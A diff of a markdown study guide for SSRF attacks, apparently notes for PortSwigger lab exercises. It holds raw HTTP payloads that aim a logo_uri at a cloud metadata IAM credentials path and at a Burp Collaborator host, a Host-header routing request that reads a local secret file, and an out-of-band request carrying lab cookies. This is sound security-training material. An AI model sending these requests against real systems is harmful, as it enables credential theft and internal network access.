@@ -517,7 +517,9 @@ Content-Length: 206
 
 {
 "redirect_uris":["https://example.com"],
-    "logo_uri" : "https://ct9vlhusb0to24fcrs5t3qsmpdv4jv7k.oastify.com","logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+    "logo_uri" : "https://ct9vlhusb0to24fcrs5t3qsmpdv4jv7k.oastify.com",
+	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+	
 }  
 ```  
 
@@ -548,11 +550,9 @@ Content-Length: 206
 [PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
 
 
-### HOST header routing-based  
+### SSRF HOST header routing  
 
->Routing-based SSRF via the Host header allow the exploit to access an localhost intranet service.  
-
-[PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  
+>Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  
 
 ```html
 GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlos/secret HTTP/1.1
@@ -561,7 +561,28 @@ Host: localhost
 
 <sub>**Note:** Convert the GET request to POST</sub>  
 
-### HTML to PDF 
+![Routing-based SSRF](Routing-based-SSRF.png)  
+
+```html
+POST / HTTP/1.1
+Host: 5rxojasl9trh0xd5pl3m1jqfn6txhp5e.oastify.com
+Cookie: _lab=46%7cMCwCFBucXjC6hvd9WC4%2fwP3%2fkmpxu8mhAhR%2f9lrAED4p89w%2bSBi%2fujGmrnwZhjZyG%2fmQebBgi4naIZO%2flg2daYidh0KoLFjVIEV1DKMwigDLRyL4BspAm4Kiz4iRmXJYyTpvojI18biLNQEbid7G4fT6SvZuUjONK2CLqa%2bc8VqLQcU%3d; session=GvdpmebBL2eNQZMJjJmSh4ZU8QrTDVDq
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+```  
+
+[PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  
+
+### HTML to PDF  
 
 >Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
